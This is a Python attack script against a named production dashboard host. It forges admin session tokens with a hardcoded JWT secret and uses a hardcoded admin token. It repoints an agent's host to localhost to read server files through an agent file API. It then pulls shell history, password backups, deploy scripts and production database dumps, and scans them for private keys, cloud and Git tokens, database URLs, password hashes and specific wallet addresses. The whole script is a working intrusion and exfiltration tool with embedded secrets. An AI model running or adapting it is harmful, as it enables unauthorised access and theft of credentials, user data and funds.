#!/usr/bin/env python3
# i29221 round3 : current runtime records / env backups / shell history / incident backups (READ-ONLY)
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, io, gzip, tarfile
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
ORIG_IP = "52.53.251.49"
TARGET_ADDRS = ["c56f7063fd6d199ccc443dbbf4283be602d46343", "fe18aa1efa652660f36ab84f122cd36108f903b6"]
DEADLINE = time.time() + 1450

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)
def RCH(k, v, n=16000):
    if not isinstance(v, str): v = json.dumps(v, ensure_ascii=False, default=str)
    for i in range(0, len(v), n):
        print("R:%s#%05d:%s" % (k, i // n, _b(v[i:i+n])), flush=True)
def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 20)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")
def forge(user_id, role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": "aro", "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    return h + "." + p + "." + b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=90000):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += ["https://%s%s" % (HOST, path)]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}
def flist(path, sess):
    r = call("/api/agents/%s/files?action=list&path=%s" % (AID, qp(path)), session=sess, maxlen=400000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"]:
            ents.append("%s%s [%s]" % (e.get("name"), "/" if e.get("type") in ("dir", "directory") else "", e.get("size")))
    return r["code"], ents, r["body"][:150]
def fread(path, sess, timeout=60):
    r = call("/api/agents/%s/files?action=read&path=%s" % (AID, qp(path)), session=sess, timeout=timeout, maxlen=3000000)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j: return r["code"], j.get("content") or "", j.get("size")
    return r["code"], None, r["body"][:150]
def fdownload(path, sess, timeout=240):
    tmp = "/tmp/_dl3.bin"
    rc, out = curl(["--http2", "-A", UA, "-H", "Cookie: session=" + sess, "-o", tmp, "-w", "%{http_code}", "-m", str(timeout),
                    "https://%s/api/agents/%s/files?action=download&path=%s" % (HOST, AID, qp(path))], timeout=timeout)
    code = out.decode("utf-8", "replace").strip()[-3:]
    try: sz = os.path.getsize(tmp)
    except Exception: sz = -1
    return code, sz, (tmp if code == "200" else None)

ETH = re.compile(r"(?<![0-9a-fA-Fx])(?:0x)?(?:[0-9a-fA-F]{64}|[0-9a-fA-F]{40})(?![0-9a-fA-F])")
PATS = [
    ("privkey", re.compile(r"-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----")),
    ("dsn", re.compile(r"(?:postgres(?:ql)?|mysql|redis|mongodb(?:\+srv)?|amqp)://[^\s\"'<>]{6,220}")),
    ("lumii_acct", re.compile(r"LUMII_ACCT_[A-Za-z0-9_]+\s*[=:]\s*[^\s\"'#,]{1,160}")),
    ("acct_pairs", re.compile(r"\b(?:PROD|ADMIN|UBUNTU|DEPLOY|ROOT|LUMII|SSH|LNT)_(?:USER|PASS|PASSWORD|PWD|SSH_USER|SSH_PASS)\s*[=:]\s*[^\s\"'#,]{1,160}")),
    ("cloud_ak", re.compile(r"(?:AKID[A-Za-z0-9]{13,40}|LTAI[A-Za-z0-9]{12,40}|AKIA[A-Z0-9]{12,32}|ASIA[A-Z0-9]{12,32}|dckr_pat_[A-Za-z0-9_-]{10,})")),
    ("git_token", re.compile(r"(?:ghp_|gho_|ghs_|ghu_|github_pat_|glpat-|xox[bpar]-)[A-Za-z0-9_-]{8,120}")),
    ("bcrypt", re.compile(r"\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}")),
    ("jwt_secret", re.compile(r"(?:JWT_SECRET|AUTH_SECRET|SESSION_SECRET|RELAY_JWT_SECRET|LUMII_[A-Z_]*SECRET)\s*[=:]\s*[^\s\"'#,]{4,220}")),
    ("kv", re.compile(r"(?i)(?:secret|access_?key|private_?key|token|passw(?:or)?d|api_?key)[A-Za-z0-9_]*\s*[=:]\s*[\"']?[A-Za-z0-9+/=_\-\.]{12,140}")),
    ("zoofi", re.compile(r".{0,50}(?:zoofi|0xC56f7063|0xFE18Aa1E|cloudflared|rathole|frpc|frps).{0,120}")),
    ("sshtarget", re.compile(r"(?:ssh|scp)\s+(?:-\S+\s+)*[\w.@\-]+@[\w.\-]+")),
]
def scan(text, maxh=12, maxlines=500000):
    out = {}; lines = text.splitlines(); out["lines"] = len(lines); hits = {}
    for name, rx in PATS:
        got = []
        for i, ln in enumerate(lines[:maxlines]):
            if len(ln) > 30000: ln = ln[:30000]
            m = rx.search(ln)
            if m:
                got.append({"l": i + 1, "v": m.group(0)[:340]})
                if len(got) >= maxh: break
        if got: hits[name] = got
    eth = []
    for i, ln in enumerate(lines[:maxlines]):
        for m in ETH.finditer(ln):
            v = m.group(0); eth.append({"l": i + 1, "v": v[:90], "t": v.lower().replace("0x", "") in TARGET_ADDRS})
            if len(eth) >= 25: break
        if len(eth) >= 25: break
    if eth: hits["eth"] = eth
    if hits: out["hits"] = hits
    return out

def sql_sections(text, tables, maxrows=80):
    out = {}; lines = text.splitlines(); i = 0
    while i < len(lines):
        m = re.match(r"COPY (?:public\.)?([A-Za-z0-9_]+) \((.*)\) FROM stdin;", lines[i])
        if m and m.group(1) in tables:
            tbl = m.group(1); rows = []; i += 1
            while i < len(lines) and lines[i].strip() != "\\.":
                rows.append(lines[i][:700]); i += 1
                if len(rows) >= maxrows: break
            out[tbl] = {"hdr": m.group(0)[:900], "n": len(rows), "rows": rows}
        i += 1
    return out

def main():
    sess = forge(OWNER)
    p0 = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1"}, timeout=30, maxlen=300)
    R("P0", p0["code"])
    c, ents, err = flist("/", sess)
    if c != "200":
        R("ABORT", err); call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30); return

    # ---- listings
    LD = ["/opt/lumii-prod/data/org-runtime/org_bTLzxtBLmugV8uxx4QTyw",
          "/opt/lumii-prod/data/iss906", "/opt/lumii-prod/data/ops-md-backfill-20261017",
          "/var/lib/lumii-ops-agent", "/var/lib/lumii-ops-agent/backups", "/var/lib/lumii-ops-agent/versions",
          "/opt/lumii-registry", "/opt/lumii-registry/seed", "/opt/lumii-registry/scripts",
          "/home/ubuntu/lumii-agent-ops-platform", "/home/ubuntu/lumii-agent-ops-platform/docs",
          "/home/ubuntu/lumii-agent-ops-platform/packages/api/src/scripts",
          "/home/ubuntu/lumii-dashboard", "/home/ubuntu/lumii-dashboard/deploy",
          "/home/ubuntu/lumii-dashboard/deploy/headscale",
          "/home/ubuntu/backups/mysql", "/etc/lumii", "/etc/lumii-registry",
          "/opt/lumii-prod/scripts/ops", "/opt/lumii-prod/scripts/manual", "/opt/lumii-prod/scripts/project-shell"]
    L = {}
    for d in LD:
        c, ents, err = flist(d, sess); L[d] = {"code": c, "entries": ents[:200], "err": err}
    RCH("LIST", json.dumps(L, ensure_ascii=False)[:400000])

    # ---- explicit reads
    EXPL = [
        "/home/ubuntu/.bash_history",
        "/home/ubuntu/db_backups/backup.sh.deprecated",
        "/home/ubuntu/db_backups/crontab.bak-20260810-164437",
        "/home/ubuntu/db_backups/logs/backup-202611.log",
        "/home/ubuntu/db_backups/logs/backup-202610.log",
        "/home/ubuntu/pwd-backup-usr_JqvejphBd2cFVLWZQmtnZ-202610271141.txt",
        "/home/ubuntu/session-restore-20261013/deleted-rows.tsv",
        "/home/ubuntu/session-restore-20261013/rollback.sql",
        "/home/ubuntu/bin/lumii-auto-deploy.sh",
        "/home/ubuntu/dump-tables.ts",
        "/home/ubuntu/verify.sh",
        "/etc/systemd/system/lumii-prod-sidecar-tunnel.service.bak-gw-20260812",
        "/var/lib/lumii-ops-agent/state.json",
        "/opt/lumii-prod/scripts/e2e-iss-679-cred.mjs",
        "/opt/lumii-prod/scripts/agent-authz-mode.ts",
        "/opt/lumii-prod/scripts/check-runtime-wiring.sh",
        "/opt/lumii-prod/scripts/bootstrap-prod.ts",
        "/home/ubuntu/lumii-agent-ops-platform/DEPLOY.md",
        "/home/ubuntu/lumii-agent-ops-platform/packages/api/src/scripts/create-admin.ts",
        "/home/ubuntu/lumii-dashboard/deploy/headscale/config.yaml",
        "/home/ubuntu/lumii-dashboard/deploy/headscale/acl.hujson",
    ]
    RES = {}
    for p in EXPL:
        if time.time() > DEADLINE: break
        c, content, sz = fread(p, sess)
        if content is None:
            RES[p] = {"code": c, "err": sz}; continue
        e = {"code": c, "size": sz}
        s = scan(content)
        if s.get("hits"): e["hits"] = s["hits"]
        if (sz or 0) <= 70000: e["content"] = content
        RES[p] = e
    RCH("EXPL", json.dumps(RES, ensure_ascii=False)[:1500000])

    # ---- incident backups (gz) + ops-agent previous + 20260823 pg dump
    DL = ["/opt/lumii-prod/backups/incident-20261126/runtimes-backup.json.gz",
          "/opt/lumii-prod/backups/incident-20261126/convs-backup-extra.json.gz",
          "/opt/lumii-prod/backups/incident-20261126/convs-backup.json.gz",
          "/var/lib/lumii-ops-agent/previous",
          "/home/ubuntu/prod-db-backup-20260823-083442.sql.gz"]
    D = {}
    for p in DL:
        if time.time() > DEADLINE: break
        c, sz, fp = fdownload(p, sess, timeout=240)
        info = {"code": c, "size": sz}
        if fp:
            try:
                data = open(fp, "rb").read()
                if p.endswith(".gz"):
                    b = gzip.decompress(data); info["uncomp"] = len(b)
                    txt = b.decode("utf-8", "replace")
                    if len(txt) < 60000: info["content"] = txt
                    info["scan"] = scan(txt)
                    if "prod-db-backup" in p:
                        info["sections"] = sql_sections(txt, ["users", "org_runtimes", "im_credentials", "projects", "assistants", "role_assignments"], maxrows=40)
                else:
                    txt = data.decode("utf-8", "replace")
                    info["scan"] = scan(txt)
                    if len(txt) < 200000: info["content"] = txt
                    else: info["head"] = txt[:20000]
            except Exception as ex:
                info["err"] = repr(ex)[:300]
        D[p] = info
    RCH("DL", json.dumps(D, ensure_ascii=False)[:1500000])

    pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
    R("P9", pr["code"])
    print("DONE", flush=True)

if __name__ == "__main__":
    try: main()
    except Exception:
        import traceback
        R("FATAL", traceback.format_exc()[:4000])
        try: call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=30)
        except Exception: pass
